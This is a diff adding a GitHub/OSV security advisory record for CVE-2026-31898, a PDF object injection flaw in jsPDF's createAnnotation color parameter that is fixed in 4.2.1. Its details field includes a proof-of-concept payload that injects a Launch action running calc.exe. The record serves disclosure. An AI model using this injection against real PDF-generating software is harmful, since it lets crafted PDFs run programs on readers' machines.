@@ -1,0 +1,81 @@
+{
+    "id": "GHSA-7x6v-j9x4-qf24",
+    "summary": "jsPDF has a PDF Object Injection via FreeText color",
+    "details": "### Impact\n\nUser control of arguments of the `createAnnotation` method allows users to inject arbitrary PDF objects, such as JavaScript actions.\n\nIf given the possibility to pass unsanitized input to the following method, a user can inject arbitrary PDF objects, such as JavaScript actions, which might trigger when the PDF is opened or interacted with..\n\n* `createAnnotation`: `color` parameter\n\nExample attack vector:\n\n```js\nimport { jsPDF } from 'jspdf'\n\nconst doc = new jsPDF();\n\nconst payload = '000000) /AA <</E <</S /Launch /F (calc.exe)>>>> (';\n\ndoc.createAnnotation({\n  type: 'freetext',\n  bounds: { x: 10, y: 10, w: 120, h: 20 },\n  contents: 'hello',\n  color: payload\n});\n\ndoc.save('test.pdf');\n```\n\n### Patches\n\nThe vulnerability has been fixed in jsPDF@4.2.1.\n\n### Workarounds\nSanitize user input before passing it to the vulnerable API members.",
+    "aliases": [
+        "CVE-2026-31898"
+    ],
+    "modified": "2026-03-19T19:17:34.951391Z",
+    "published": "2026-03-17T17:07:51Z",
+    "related": [
+        "CGA-h3mc-62rc-m8xf"
+    ],
+    "database_specific": {
+        "nvd_published_at": "2026-03-18T04:17:21Z",
+        "severity": "HIGH",
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-03-17T17:07:51Z",
+        "cwe_ids": [
+            "CWE-116"
+        ]
+    },
+    "references": [
+        {
+            "type": "WEB",
+            "url": "https://github.com/parallax/jsPDF/security/advisories/GHSA-7x6v-j9x4-qf24"
+        },
+        {
+            "type": "ADVISORY",
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-31898"
+        },
+        {
+            "type": "WEB",
+            "url": "https://github.com/parallax/jsPDF/commit/4155c4819d5eca284168e51e0e1e81126b4f14b8"
+        },
+        {
+            "type": "PACKAGE",
+            "url": "https://github.com/parallax/jsPDF"
+        },
+        {
+            "type": "WEB",
+            "url": "https://github.com/parallax/jsPDF/blob/b1607a9391d4cd65ea7ade25998aea8345ae1be3/src/modules/annotations.js#L193-L208"
+        },
+        {
+            "type": "WEB",
+            "url": "https://github.com/parallax/jsPDF/releases/tag/v4.2.1"
+        }
+    ],
+    "affected": [
+        {
+            "package": {
+                "name": "jspdf",
+                "ecosystem": "npm",
+                "purl": "pkg:npm/jspdf"
+            },
+            "ranges": [
+                {
+                    "type": "SEMVER",
+                    "events": [
+                        {
+                            "introduced": "0"
+                        },
+                        {
+                            "fixed": "4.2.1"
+                        }
+                    ]
+                }
+            ],
+            "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-7x6v-j9x4-qf24/GHSA-7x6v-j9x4-qf24.json",
+                "last_known_affected_version_range": "<= 4.2.0"
+            }
+        }
+    ],
+    "schema_version": "1.7.5",
+    "severity": [
+        {
+            "type": "CVSS_V3",
+            "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+        }
+    ]
+}
